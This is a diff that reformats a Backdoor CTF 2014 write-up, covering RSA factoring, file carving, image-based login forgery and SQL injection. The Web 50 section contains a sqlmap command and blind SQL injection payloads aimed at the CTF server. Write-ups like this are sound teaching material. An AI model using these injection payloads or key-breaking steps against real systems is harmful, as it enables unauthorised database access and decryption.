@@ -1,76 +1,79 @@
-<p><link rel='stylesheet' href='markdown8.css'/></p>
+---
+layout: post
+title: "Backdoor 2014 Writeups"
+description: ""
+category: Writeups
+tags: [backdoor2014]
+---
+<!--{% include JB/setup %}-->
 
-<h1>Backdoor CTF 2014 Writeups</h1>
+### Crypto 10
 
-<p>With reasonable brevity by SIGINT </p>
+    [andrew@archa backdoor]$ binwalk -e crypto10.jpg 
+ 
+    DECIMAL  HEX      DESCRIPTION
+    -----------------------------------------------------------
+    0        0x0      JPEG image data, JFIF standard  1.01
+    40804    0x9F64   Zip archive data, name: "got2.jpg"  
+    73941    0x120D5  End of Zip archive
+ 
+    [andrew@archa _crypto10.jpg.extracted]$ binwalk -e got2.jpg 
+ 
+    DECIMAL  HEX     DESCRIPTION
+    -----------------------------------------------------------
+    0        0x0     JPEG image data, JFIF standard  1.02
+    33587    0x8333  Zip archive data, name: "txt.txt"  
+    33761    0x83E1  End of Zip archive
+ 
+    [andrew@archa _got2.jpg.extracted]$ cat txt.txt 
+    6307834008eb8edbe18c7a20ee4a909d
 
-<p><a id="crypto10"></a></p>
+<!--more-->
 
-<h2>Crypto 10</h2>
+### Crypto 100
 
-<pre><code>[andrew@archa backdoor]$ binwalk -e crypto10.jpg 
+    [andrew@archa backdoor]$ hexdump -C ciphertext.txt 
+    00000000  0c 08 d1 e9 22 a6 12 49  20 45 73 2b 00 a5 46 40  |...."..I Es+..F@|
+    00000010  cb 25 2e 2e 84 f0 75 8a  f3 87 d6 0c              |.%....u.....|
+    0000001c
 
-DECIMAL  HEX      DESCRIPTION
------------------------------------------------------------
-0        0x0      JPEG image data, JFIF standard  1.01
-40804    0x9F64   Zip archive data, name: "got2.jpg"  
-73941    0x120D5  End of Zip archive
+    [andrew@archa backdoor]$ openssl rsa -in id.pub -pubin -text    
+    Public-Key: (220 bit)
+    Modulus:
+        0c:09:e7:ec:78:f2:f8:ad:a9:95:34:48:22:64:77:
+        28:1b:09:9d:18:35:70:2b:4d:e5:07:5d:6b
+    Exponent: 65537 (0x10001)
+    writing RSA key
+    -----BEGIN PUBLIC KEY-----
+    MDcwDQYJKoZIhvcNAQEBBQADJgAwIwIcDAnn7Hjy+K2plTRIImR3KBsJnRg1cCtN
+    5QddawIDAQAB
+    -----END PUBLIC KEY-----
 
-[andrew@archa _crypto10.jpg.extracted]$ binwalk -e got2.jpg 
 
-DECIMAL  HEX     DESCRIPTION
------------------------------------------------------------
-0        0x0     JPEG image data, JFIF standard  1.02
-33587    0x8333  Zip archive data, name: "txt.txt"  
-33761    0x83E1  End of Zip archive
+[This page](http://en.wikipedia.org/wiki/RSA_Factoring_Challenge) shows that
+factoring a 330-bit key was possible in 1991. Absent any other weaknesses, it
+seems that all we have to do is factor the modulus of the public key. Here I use
+CADO-NFS to factor the modulus.
 
-[andrew@archa _got2.jpg.extracted]$ cat txt.txt 
-6307834008eb8edbe18c7a20ee4a909d
-</code></pre>
+    &gt;&gt;&gt; int('0c:09:e7:ec:78:f2:f8:ad:a9:95:34:48:22: \
+    ... 64:77:28:1b:09:9d:18:35:70:2b:4d:e5:07:5d:6b'.replace(':',''),16)          
+    1267822572326555807122159576684530178338449545988069238646937967979L
+    
+    [andrew@archa backdoor]$ /usr/libexec/cado-nfs/bin/factor.sh 1267822572326555807122159576684530178338449545988069238646937967979 
+    &lt; math omitted &gt;
+    Info:Complete Factorization: Total cpu/real time for everything: 230.48/248.437
+    1162435056374824133712043309728653 1090660992520643446103273789680343
+    OK
 
-<p><a id="crypto100"></a></p>
+I have a local script to generate an RSA private key file from provided p and q
+values, but it's possible to use an online generator if you are less
+paranoid.
 
-<h2>Crypto 100</h2>
+    [andrew@archa backdoor]$ wget "http://rose.makesad.us/~schoen/cgi-bin/private-from-pq.cgi?1162435056374824133712043309728653&amp;1090660992520643446103273789680343" -O id.pem
+    [andrew@archa backdoor]$ openssl rsautl -decrypt -inkey id.pem &lt; ciphertext.txt 
+    random_prime_gen
 
-<pre><code>[andrew@archa backdoor]$ hexdump -C ciphertext.txt 
-00000000  0c 08 d1 e9 22 a6 12 49  20 45 73 2b 00 a5 46 40  |...."..I Es+..F@|
-00000010  cb 25 2e 2e 84 f0 75 8a  f3 87 d6 0c              |.%....u.....|
-0000001c
 
-[andrew@archa backdoor]$ openssl rsa -in id.pub -pubin -text    
-Public-Key: (220 bit)
-Modulus:
-    0c:09:e7:ec:78:f2:f8:ad:a9:95:34:48:22:64:77:
-    28:1b:09:9d:18:35:70:2b:4d:e5:07:5d:6b
-Exponent: 65537 (0x10001)
-writing RSA key
------BEGIN PUBLIC KEY-----
-MDcwDQYJKoZIhvcNAQEBBQADJgAwIwIcDAnn7Hjy+K2plTRIImR3KBsJnRg1cCtN
-5QddawIDAQAB
------END PUBLIC KEY-----
-</code></pre>
-
-<p><a href="http://en.wikipedia.org/wiki/RSA_Factoring_Challenge">This page</a> shows that factoring a 330-bit key was possible in 1991. Absent any other weaknesses, it seems that all we have to do is factor the modulus of the public key. Here I use CADO-NFS to factor the modulus.</p>
-
-<pre><code>&gt;&gt;&gt; int('0c:09:e7:ec:78:f2:f8:ad:a9:95:34:48:22: \
-... 64:77:28:1b:09:9d:18:35:70:2b:4d:e5:07:5d:6b'.replace(':',''),16)          
-1267822572326555807122159576684530178338449545988069238646937967979L
-
-[andrew@archa backdoor]$ /usr/libexec/cado-nfs/bin/factor.sh 1267822572326555807122159576684530178338449545988069238646937967979 
-&lt; math omitted &gt;
-Info:Complete Factorization: Total cpu/real time for everything: 230.48/248.437
-1162435056374824133712043309728653 1090660992520643446103273789680343
-OK
-</code></pre>
-
-<p>I have a local script to generate an RSA private key file from provided p and q values, but it's possible to use an online generator if you are less paranoid.</p>
-
-<pre><code>[andrew@archa backdoor]$ wget "http://rose.makesad.us/~schoen/cgi-bin/private-from-pq.cgi?1162435056374824133712043309728653&amp;1090660992520643446103273789680343" -O id.pem
-[andrew@archa backdoor]$ openssl rsautl -decrypt -inkey id.pem &lt; ciphertext.txt 
-random_prime_gen
-</code></pre>
-
-<p><a id="web10"></a></p>
 
 <h2>Web 10</h2>
 
@@ -97,8 +100,6 @@ random_prime_gen
 
 <p>Do you spot the flag?</p>
 
-<p><a id="web30"></a></p>
-
 <h2>Web 30</h2>
 
 <pre><code>[andrew@archa ~]$ curl http://backdoor.cognizance.org.in/problems/web30/ -D - -o /dev/null 
@@ -123,8 +124,6 @@ Sorry , you will never get a flag in your life :P  Not authorized
 Here is a flag : aeba37a3aaffc93567a61d9a67466fdf
 </code></pre>
 
-<p><a id="web50"></a></p>
-
 <h2>Web 50</h2>
 
 <p>The PHP script appears to be running a SQL query of the form <code>SELECT FROM QUOTES WHERE quote LIKE '$search';</code></p>
@@ -135,7 +134,7 @@ Here is a flag : aeba37a3aaffc93567a61d9a67466fdf
 
 <pre><code>sqlmap -u http://backdoor.cognizance.org.in/problems/web50/search.php --data="search=f" --tables --threads 10 --exclude-sysdbs
 
----
+\---
 Place: POST
 Parameter: search
     Type: boolean-based blind
@@ -145,7 +144,7 @@ Payload: search=f%' AND 5266=5266 AND '%'='
 Type: AND/OR time-based blind
 Title: MySQL &gt; 5.0.11 AND time-based blind
     Payload: search=f%' AND SLEEP(5) AND '%'='
----
+\---
 
 Database: sqli_db
 [2 tables]
@@ -169,7 +168,6 @@ Table: the_flag_is_over_here
 +----------------------------------+
 </code></pre>
 
-<p><a id="web100-1"></a></p>
 
 <h2>Web 100-1</h2>
 
@@ -202,8 +200,6 @@ Table: the_flag_is_over_here
    &lt;/body&gt;
  &lt;/html&gt;
 </code></pre>
-
-<p><a id="web300"></a></p>
 
 <h2>Web 300</h2>
 
@@ -308,7 +304,6 @@ Table: the_elusive_flag
 +----------------------------------+
 </code></pre>
 
-<p><a id="misc250-2"></a></p>
 
 <h2>Misc 250-2</h2>
 
@@ -323,7 +318,7 @@ does not serve any purpose.
 Login as the sdslabs user for a change.</p>
 </blockquote>
 
-<p><img src="backdoor.bmp" alt="backdoor" title="login for backdoor user" /></p>
+<p><img src="/assets/images/backdoor2014/backdoor.bmp" alt="backdoor" title="login for backdoor user" /></p>
 
 <p>The first thing that comes to mind is changing the threshold of the image, but
 that did not do anything. OCR also came to mind, but after spending some time 
@@ -336,7 +331,7 @@ printed the color of each pixel in hex. </p>
 other colors in it. This was because the text in the image was anti-aliased, 
 so I painted over the text with #000000 and it still logged me in as the user backdoor. </p>
 
-<p><img src="try.png" alt="backdoor2" title="this also logs you in as the user backdoor" /></p>
+<p><img src="/assets/images/backdoor2014/try.png" alt="backdoor2" title="this also logs you in as the user backdoor" /></p>
 
 <p>But the image was still not all black, so I examined the pixels again and found
 that they were all either #000000 or #010101. Hmmmm, it just might be a binary
@@ -352,7 +347,7 @@ the pixel grid were completely black, so the message was probably stored in the
 top row. I made a new image with all the pixels changed to #123456 except for
 the ones in the top row and successfully logged in using it.</p>
 
-<p><img src="backdoor3.png" alt="backdoor3" title="this also logs you in" /></p>
+<p><img src="/assets/images/backdoor2014/backdoor3.png" alt="backdoor3" title="this also logs you in" /></p>
 
 <p>I continued changing everything but the first x pixels of the image to #123456
 and it turned out the server would accept the image if the first 80 pixels were
@@ -382,4 +377,5 @@ sure that the unused pixels from the first 80 pixels of the image were all set t
 
 <p>Then I submitted this image to log in as sdslabs and capture the flag.</p>
 
-<p><img src="try3.png" alt="for_flag" title="sdslabs login image" /></p>
+<p><img src="/assets/images/backdoor2014/try3.png" alt="for_flag" title="sdslabs login image" /></p>
+
